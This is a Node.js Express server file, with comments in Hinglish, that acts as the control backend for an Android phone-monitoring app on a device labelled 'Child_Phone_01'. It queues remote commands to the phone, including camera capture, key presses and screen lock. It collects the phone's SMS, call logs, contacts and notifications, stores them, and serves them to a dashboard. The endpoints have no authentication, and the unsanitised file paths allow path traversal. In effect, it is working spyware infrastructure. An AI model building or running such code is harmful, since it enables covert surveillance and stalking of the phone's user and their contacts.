const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Data storage directory
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

// ==========================================
// 1. DEVICE STATE & MULTI-CONTROL SYSTEM
// ==========================================
let deviceState = {
    "Child_Phone_01": {
        model: "Waiting...",
        android_version: "--",
        battery: 0,
        isOnline: false,
        lastSeen: 0,
        ringerMode: "normal", 
        currentCommand: "none" // Commands: cam_front, cam_back, cam_stop, key_back, key_home, key_lock, vol_up, vol_down
    }
};

// Index Dashboard ke liye status API
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || {};
    const isOnline = (Date.now() - state.lastSeen) < 10000; 
    res.json({ ...state, isOnline });
});

// ==========================================
// 2. COMMAND CENTER (Camera & Screen Control)
// ==========================================
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (deviceState[device_id]) {
        deviceState[device_id].currentCommand = command;
        console.log(`📡 Sending Action: [${command}] to ${device_id}`);
        res.json({ status: "success", msg: "Command Queued" });
    } else {
        res.status(404).send("Device not found");
    }
});

// Android App yahan se commands check karega
app.get('/api/get-command/:device_id', (req, res) => {
    const deviceId = req.params.device_id;
    const cmd = deviceState[deviceId] ? deviceState[deviceId].currentCommand : "none";
    
    // Command fetch hone ke baad hum "none" kar dete hain taaki phone loop na kare
    if(deviceState[deviceId]) deviceState[deviceId].currentCommand = "none";
    
    res.json({ command: cmd });
});

// ==========================================
// 3. ANDROID DATA UPLOAD (Status & Storage)
// ==========================================

// Battery, Name aur Silent status update
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    deviceState[device_id] = {
        ...deviceState[device_id],
        model, android_version, battery, ringerMode,
        lastSeen: Date.now()
    };
    res.send("Status OK");
});

// Har tarah ka data store karne ke liye (SMS, Calls, Contacts, Notifications)
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body; 
    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(DATA_DIR, fileName);

    if (type === 'notifications') {
        // Notifications ko purani file mein jodd (Append) dena
        let existing = [];
        if (fs.existsSync(filePath)) existing = JSON.parse(fs.readFileSync(filePath));
        existing.push(...data);
        fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
    } else {
        // SMS, Calls, Contacts ko taaza (Refresh) karna
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    }
    console.log(`💾 Data Saved: ${type} for ${device_id}`);
    res.send("Sync Complete");
});

// ==========================================
// 4. GUI FETCH API (Sare Pages ke liye)
// ==========================================
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SERVER RUNNING ON PORT: ${PORT}`);
    console.log(`📁 Local Data Path: ${DATA_DIR}`);
});
